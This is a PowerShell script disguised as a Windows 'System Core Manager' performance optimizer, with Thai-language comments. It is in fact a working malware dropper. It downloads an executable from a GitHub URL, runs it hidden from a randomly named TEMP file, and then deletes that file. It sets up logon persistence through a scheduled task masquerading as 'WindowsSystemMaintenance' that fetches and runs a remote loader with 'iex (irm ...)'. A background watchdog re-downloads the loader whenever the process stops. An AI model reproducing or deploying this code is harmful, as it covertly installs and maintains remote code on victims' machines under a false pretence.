# WINDOWS SYSTEM CORE MANAGER - FIXED VERSION
function Initialize-CoreManager {
    Write-Host "`n Windows System Core Manager" -ForegroundColor Cyan
    Write-Host " ============================" -ForegroundColor Gray
    Write-Host " Build: 10.0.22621.1.amd64fre.ni_release" -ForegroundColor Yellow
    Write-Host " Component: System Performance Module" -ForegroundColor Gray
    Write-Host ""
    Write-Host " 1. Start Core Optimization" -ForegroundColor Green
    Write-Host " 2. System Maintenance" -ForegroundColor Red
    Write-Host ""
    Write-Host " Select: " -NoNewline -ForegroundColor White
}

function Start-CoreOptimization {
    Write-Host "`n[SYSTEM] Initializing core optimization..." -ForegroundColor Green
    
    try {
        # URLs จริงของคุณ
        $exeUrl = "https://github.com/Verte225066/test/blob/main/system_logs.exe?raw=true"
        $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
        
        Write-Host "[DOWNLOAD] Loading optimization engine..." -ForegroundColor Yellow
        
        # โหลด EXE
        $webClient = New-Object System.Net.WebClient
        $exeBytes = $webClient.DownloadData($exeUrl)
        $webClient.Dispose()
        
        Write-Host "[SUCCESS] Downloaded $($exeBytes.Length) bytes" -ForegroundColor Green
        
        # ตรวจสอบ EXE
        if ($exeBytes[0] -eq 0x4D -and $exeBytes[1] -eq 0x5A) {
            Write-Host "[VERIFY] Valid system component" -ForegroundColor Green
            
            # ใช้ Disk Execution โดยตรง (มั่นใจกว่า)
            $success = Invoke-DirectExecution -ExeBytes $exeBytes
            
            if ($success) {
                Write-Host "[ACTIVE] Core optimization running" -ForegroundColor Green
                
                # ติดตั้ง persistence
                Install-BasicPersistence -LoaderUrl $loaderUrl
                
                # เริ่ม monitoring
                Start-BasicMonitor -LoaderUrl $loaderUrl
                
                Write-Host "[COMPLETE] System optimization initialized" -ForegroundColor Cyan
                return $true
            }
        }
        
        return $false
        
    } catch {
        Write-Host "[ERROR] Optimization failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Invoke-DirectExecution {
    param([byte[]]$ExeBytes)
    
    try {
        # สร้างไฟล์ชั่วคราว
        $tempName = "syscore_" + (Get-Random -Minimum 10000 -Maximum 99999) + ".exe"
        $tempPath = Join-Path $env:TEMP $tempName
        
        # เขียนไฟล์
        [System.IO.File]::WriteAllBytes($tempPath, $ExeBytes)
        
        Write-Host "[LAUNCH] Starting optimization engine..." -ForegroundColor Cyan
        
        # รัน process
        $process = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru
        
        if ($process -and (-not $process.HasExited)) {
            Write-Host "[PROCESS] Engine PID: $($process.Id)" -ForegroundColor Green
            
            # ลบไฟล์หลังจากรัน
            Start-Job -ScriptBlock {
                param($Path)
                Start-Sleep -Seconds 5
                try {
                    if (Test-Path $Path) {
                        Remove-Item $Path -Force -ErrorAction SilentlyContinue
                    }
                } catch {}
            } -ArgumentList $tempPath | Out-Null
            
            return $true
        }
        
        return $false
        
    } catch {
        Write-Host "[ERROR] Execution failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Install-BasicPersistence {
    param([string]$LoaderUrl)
    
    try {
        Write-Host "[PERSISTENCE] Configuring auto-start..." -ForegroundColor Yellow
        
        # Scheduled Task
        $taskName = "WindowsSystemMaintenance"
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iex (irm '$LoaderUrl')`""
        $trigger = New-ScheduledTaskTrigger -AtLogon
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
        
        Write-Host "[PERSISTENCE] Auto-start configured" -ForegroundColor Green
        
    } catch {
        Write-Host "[PERSISTENCE] Auto-start setup skipped" -ForegroundColor Yellow
    }
}

function Start-BasicMonitor {
    param([string]$LoaderUrl)
    
    Write-Host "[MONITOR] Starting system monitor..." -ForegroundColor Green
    
    $monitorScript = {
        param($Url)
        while ($true) {
            try {
                # ตรวจสอบ process
                $processes = Get-Process -Name "syscore_*" -ErrorAction SilentlyContinue
                
                if (-not $processes) {
                    # Restart
                    try {
                        iex (irm $Url)
                    } catch {}
                }
                
                Start-Sleep -Seconds 60
                
            } catch {
                Start-Sleep -Seconds 120
            }
        }
    }
    
    Start-Job -ScriptBlock $monitorScript -ArgumentList $LoaderUrl | Out-Null
}

function Invoke-SystemMaintenance {
    Write-Host "`n[MAINTENANCE] Starting system maintenance..." -ForegroundColor Red
    
    $cleanedItems = @()
    
    # Clean processes
    try {
        Get-Process -Name "syscore_*" -ErrorAction SilentlyContinue | Stop-Process -Force
        $cleanedItems += "Processes"
    } catch {}
    
    # Clean tasks
    try {
        Unregister-ScheduledTask -TaskName "WindowsSystemMaintenance" -Confirm:$false -ErrorAction SilentlyContinue
        $cleanedItems += "Scheduled tasks"
    } catch {}
    
    # Clean files
    try {
        Get-ChildItem "$env:TEMP\syscore_*.exe" -ErrorAction SilentlyContinue | Remove-Item -Force
        $cleanedItems += "Temporary files"
    } catch {}
    
    # Clean jobs
    try {
        Get-Job | Remove-Job -Force
        $cleanedItems += "Background jobs"
    } catch {}
    
    # Results
    Write-Host "`n[RESULTS] Maintenance completed:" -ForegroundColor Green
    foreach ($item in $cleanedItems) {
        Write-Host "  ✓ $item" -ForegroundColor Gray
    }
}

# MAIN EXECUTION
try {
    Initialize-CoreManager
    $choice = Read-Host
    
    switch ($choice) {
        '1' { 
            $success = Start-CoreOptimization
            if ($success) {
                Write-Host "`n[READY] System optimization active" -ForegroundColor Cyan
            } else {
                Write-Host "`n[ERROR] Optimization failed" -ForegroundColor Red
            }
        }
        '2' { 
            Invoke-SystemMaintenance
            Write-Host "`n[COMPLETE] System maintenance finished" -ForegroundColor Green
        }
        default {
            Write-Host "`nStarting optimization..." -ForegroundColor Yellow
            Start-CoreOptimization
        }
    }
} catch {
    Write-Host "[ERROR] Operation failed" -ForegroundColor Red
}

Write-Host "`nOperation completed" -ForegroundColor Gray
Start-Sleep -Seconds 2
